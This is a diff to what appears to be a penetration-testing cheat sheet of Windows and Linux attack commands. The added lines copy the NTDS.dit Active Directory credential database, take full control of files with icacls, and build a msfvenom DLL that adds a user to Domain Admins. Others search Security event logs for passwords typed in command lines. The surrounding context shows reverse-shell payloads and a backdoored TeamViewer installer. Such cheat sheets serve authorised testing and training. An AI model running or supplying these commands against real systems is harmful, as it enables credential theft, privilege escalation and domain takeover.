@@ -2213,6 +2213,7 @@ $ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
 C:\> dir /q <file>
 C:\> takeown /f <file>
 PS C:\> Get-ChildItem -Path '<file>' | select name,directory, @{Name=“Owner”;Expression={(Ge t-ACL $_.Fullname).Owner}}
+C:\> icacls "<file>" /grant <username>:F
 ```
 
 - Hidden Files
@@ -2786,6 +2787,12 @@ C:\> vssadmin CREATE SHADOW /For=C:
 
 ```
 C:\> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
+```
+
+- Robocopy
+
+```
+C:\> robocopy /B E:\Windows\NTDS .\ntds ntds.dit
 ```
 
 - Windows Credential Manager
@@ -3692,6 +3699,7 @@ $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f war 
 $ msfvenom -p windows/shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f exe -o shell.exe
 $ msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f elf > shell.elf
 $ msfvenom -p osx/x86/shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f macho > shell.macho
+$ msfvenom -p windows/x64/exec cmd='net group "Domain Admins" james /add /domain' -f dll -o adduser.dll
 $ msfvenom -p windows/x86/meterpreter_reverse_tcp LHOST=<IP Address> LPORT=<Port> -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
 ```
 
@@ -3736,6 +3744,14 @@ PS C:\> Get-Host
 ```
 C:\> netsh advfirewall show allprofiles
 C:\> sc query windefend
+```
+
+- View Windows Event Logs
+
+```
+C:\> wevtutil qe Security /rd:true /f:text | Select-String "/user"
+C:\> wevtutil qe Security /rd:true /f:text /r:<remote PC> /u:<username> /p:<password> | findstr "/user"
+PS C:\> Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*' } | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
 ```
 
 - View Other Active Users
